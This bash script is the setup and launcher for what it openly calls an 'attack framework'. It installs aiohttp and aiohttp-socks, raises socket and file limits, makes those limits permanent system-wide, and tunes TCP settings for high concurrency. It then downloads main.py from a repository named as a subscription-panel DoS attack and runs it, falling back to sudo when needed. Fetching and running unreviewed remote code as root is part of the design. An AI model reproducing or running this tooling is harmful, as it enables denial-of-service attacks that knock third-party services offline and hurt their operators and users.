#!/bin/bash

# Exit on critical error
set -e

echo "=== Starting setup and prerequisites installation ==="

# 1. Detect OS and package manager
PKG_MGR=""
if command -v apt &> /dev/null; then
    PKG_MGR="apt"
elif command -v yum &> /dev/null; then
    PKG_MGR="yum"
elif command -v dnf &> /dev/null; then
    PKG_MGR="dnf"
elif command -v pacman &> /dev/null; then
    PKG_MGR="pacman"
elif command -v apk &> /dev/null; then
    PKG_MGR="apk"
else
    echo "[!] No supported package manager found (apt/yum/dnf/pacman/apk)"
    exit 1
fi

echo "[+] Detected package manager: $PKG_MGR"

# 2. Install system dependencies
echo "[+] Installing Python3, pip and networking tools..."
case "$PKG_MGR" in
    apt)
        sudo apt update -y
        sudo apt install -y python3 python3-pip python3-venv curl wget ca-certificates
        ;;
    yum)
        sudo yum install -y python3 python3-pip curl wget ca-certificates
        ;;
    dnf)
        sudo dnf install -y python3 python3-pip curl wget ca-certificates
        ;;
    pacman)
        sudo pacman -Sy --noconfirm python python-pip curl wget ca-certificates
        ;;
    apk)
        sudo apk add --no-cache python3 py3-pip curl wget ca-certificates
        ;;
esac

# 3. Verify Python version
PYVER=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
echo "[+] Python version: $PYVER"

if ! python3 -c 'import sys; sys.exit(0 if sys.version_info >= (3, 8) else 1)'; then
    echo "[!] Python 3.8+ is required. Current: $PYVER"
    exit 1
fi

# 4. Install Python dependencies (aiohttp + aiohttp-socks)
echo "[+] Installing Python packages: aiohttp, aiohttp-socks..."

install_py_pkg() {
    local pkg="$1"
    # Try with --break-system-packages first (for Kali/Debian with PEP 668)
    if pip3 install "$pkg" --break-system-packages --quiet 2>/dev/null; then
        return 0
    fi
    # Try normal pip install
    if pip3 install "$pkg" --quiet 2>/dev/null; then
        return 0
    fi
    # Try with --user
    if pip3 install "$pkg" --user --quiet 2>/dev/null; then
        return 0
    fi
    # Try with sudo + --break-system-packages
    if sudo pip3 install "$pkg" --break-system-packages --quiet 2>/dev/null; then
        return 0
    fi
    return 1
}

for pkg in aiohttp aiohttp-socks; do
    echo "    -> Installing $pkg..."
    if install_py_pkg "$pkg"; then
        echo "    [✓] $pkg installed"
    else
        echo "    [!] Failed to install $pkg automatically"
        echo "    Try manually: pip3 install $pkg --break-system-packages"
    fi
done

# 5. Verify imports
echo "[+] Verifying Python imports..."
python3 - <<'PYEOF'
import sys
missing = []
for mod in ("aiohttp", "aiohttp_socks"):
    try:
        __import__(mod)
        print(f"    [✓] {mod}")
    except ImportError:
        print(f"    [!] {mod} NOT available")
        missing.append(mod)
if missing:
    sys.exit(1)
PYEOF

if [ $? -ne 0 ]; then
    echo "[!] Missing Python packages. Aborting."
    exit 1
fi

# 6. Raise file descriptor / socket limits
echo "[+] Raising socket and file descriptor limits..."

TARGET_LIMIT=65535

# Try to set for current shell
ulimit -n "$TARGET_LIMIT" 2>/dev/null && echo "    [✓] Soft limit set to $TARGET_LIMIT" \
    || echo "    [!] Could not set soft limit in current shell"

# Try to set hard limit
ulimit -Hn "$TARGET_LIMIT" 2>/dev/null && echo "    [✓] Hard limit set to $TARGET_LIMIT" \
    || echo "    [!] Could not set hard limit (may require root)"

# Persist limit in /etc/security/limits.conf if not already present
if [ -w /etc/security/limits.conf ] || [ "$(id -u)" -eq 0 ]; then
    if ! grep -q "sub-attack-nofile" /etc/security/limits.conf 2>/dev/null; then
        echo "    [*] Adding permanent limits to /etc/security/limits.conf..."
        {
            echo "* soft nofile $TARGET_LIMIT  # sub-attack-nofile"
            echo "* hard nofile $TARGET_LIMIT  # sub-attack-nofile"
        } | sudo tee -a /etc/security/limits.conf > /dev/null
        echo "    [✓] Permanent limits added (re-login required)"
    else
        echo "    [✓] Permanent limits already configured"
    fi
fi

# 7. Tune TCP stack for high concurrency (optional, requires root)
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] Tuning TCP stack for high-concurrency networking..."
    sysctl -w net.ipv4.tcp_fin_timeout=15 >/dev/null 2>&1 && echo "    [✓] tcp_fin_timeout=15"
    sysctl -w net.ipv4.tcp_tw_reuse=1 >/dev/null 2>&1 && echo "    [✓] tcp_tw_reuse=1"
    sysctl -w net.ipv4.ip_local_port_range="1024 65535" >/dev/null 2>&1 && echo "    [✓] ip_local_port_range widened"
    sysctl -w net.ipv4.tcp_max_syn_backlog=65535 >/dev/null 2>&1 && echo "    [✓] tcp_max_syn_backlog raised"
    sysctl -w fs.file-max=2097152 >/dev/null 2>&1 && echo "    [✓] fs.file-max raised"
else
    echo "[!] Skipping TCP stack tuning (requires root)"
fi

# 8. Download the main Python script from the repository
RAW_PYTHON_URL="https://raw.githubusercontent.com/coderuseplayer-netizen/subscriptionlink-panel-DoS-ATTACK/main/main.py"
SCRIPT_FILE="run.py"

echo "[+] Downloading main script from repository..."
if curl -fsSL "$RAW_PYTHON_URL" -o "$SCRIPT_FILE"; then
    echo "    [✓] Downloaded to $SCRIPT_FILE"
else
    echo "    [!] Failed to download script from $RAW_PYTHON_URL"
    exit 1
fi

chmod +x "$SCRIPT_FILE"

# 9. Run the Python script
echo ""
echo "=== Setup complete. Launching attack framework ==="
echo "    Socket limit: $(ulimit -n)"
echo ""

if [ "$(id -u)" -eq 0 ]; then
    ulimit -n "$TARGET_LIMIT"
    python3 "$SCRIPT_FILE"
else
    if ulimit -n "$TARGET_LIMIT" 2>/dev/null; then
        python3 "$SCRIPT_FILE"
    else
        echo "[!] Could not raise ulimit. Re-running with sudo..."
        sudo bash -c "ulimit -n $TARGET_LIMIT && python3 $SCRIPT_FILE"
    fi
fi
